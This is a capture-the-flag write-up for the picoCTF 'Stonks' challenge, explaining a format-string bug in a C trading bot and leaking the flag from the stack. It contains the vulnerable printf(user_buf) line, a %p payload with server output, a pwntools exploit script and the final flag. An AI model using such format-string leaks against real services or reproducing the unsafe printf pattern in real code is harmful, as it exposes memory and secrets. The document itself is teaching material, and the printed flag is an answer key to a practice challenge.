# Stonks
## Problem
> I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/62f47b5b65ec7eadb96c4e34f016f68d/vuln.c)  
`nc mercury.picoctf.net 53437`  

[link](https://play.picoctf.org/practice/challenge/105)
### Source
[vuln.c](./vuln.c)
## Solution
1. Find the exploit in source code
    ```c
    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);
    printf("Buying stonks with token:\n");
    printf(user_buf);
    ```
    we can use format string give to the `printf`, like `%p`, `%x`
2. interact with the server
    ```console
    Welcome back to the trading app!

    What would you like to do?
    1) Buy some stonks!
    2) View my portfolio
    1
    Using patented AI algorithms to buy stonks
    Stonks chosen
    What is your API token?
    %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
    Buying stonks with token:
    0x840c3f00x804b0000x80489c30xf7f37d800xffffffff0x10x840a1600xf7f451100xf7f37dc7(nil)0x840b1800x70x840c3d00x840c3f00x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x346364620x616535320xffd8007d0xf7f72af80xf7f454400x8ddaf4000x1(nil)0xf7dd4ce90xf7f460c00xf7f375c00xf7f370000xffd8d598
    Portfolio as of Mon Sep  4 15:04:29 UTC 2023


    7 shares of EZGW
    1 shares of J
    66 shares of A
    5 shares of EB
    49 shares of JO
    554 shares of C
    760 shares of MMD
    2 shares of ENW
    Goodbye!
    ```
    we can see the output from `%p`
    ```console
    0x840c3f00x804b0000x80489c30xf7f37d800xffffffff0x10x840a1600xf7f451100xf7f37dc7(nil)0x840b1800x70x840c3d00x840c3f00x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x346364620x616535320xffd8007d0xf7f72af80xf7f454400x8ddaf4000x1(nil)0xf7dd4ce90xf7f460c00xf7f375c00xf7f370000xffd8d598
    ```
    start with '0x' might be a hex number, so we can use python to convert it to ascii
3. write a python script to get the flag
    ```python
    r = remote("mercury.picoctf.net", 53437)

    r.recvlines(5)
    r.sendline(b"1")
    r.recvlines(3)
    r.sendline(b"%p" * 25)
    r.recvline()
    raw_data = r.recvline()
    print(raw_data)
    flag = ""
    for s in raw_data.split(b"0x"):
        if s == b"":
            continue
        temp = ""
        for i in range(0, len(s), 2):
            try:
                temp += chr(int(s[i:i+2], 16))
            except:
                pass
        flag += temp[::-1]
    print(flag)
    r.recvall()
4. run the script we can find the flag.
## flag
`picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}`